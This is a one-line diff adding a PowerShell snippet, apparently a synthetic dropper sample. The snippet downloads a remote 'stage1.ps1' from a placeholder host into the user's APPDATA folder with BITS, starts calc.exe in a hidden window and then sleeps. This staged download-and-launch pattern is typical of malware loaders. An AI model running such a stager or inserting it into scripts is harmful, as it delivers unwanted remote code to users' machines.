@@ -1,0 +1,1 @@
+$RemoteUrl = 'http://example.com/stage1.ps1'; $WorkingPath = "$env:APPDATA\stage2.bin"; $RequestTimeout = 189; Start-BitsTransfer -Source $RemoteUrl -Destination $WorkingPath; Start-Process -FilePath "calc.exe" -WindowStyle Hidden; $StageMarker = "stage-40"; Start-Sleep -Seconds 17
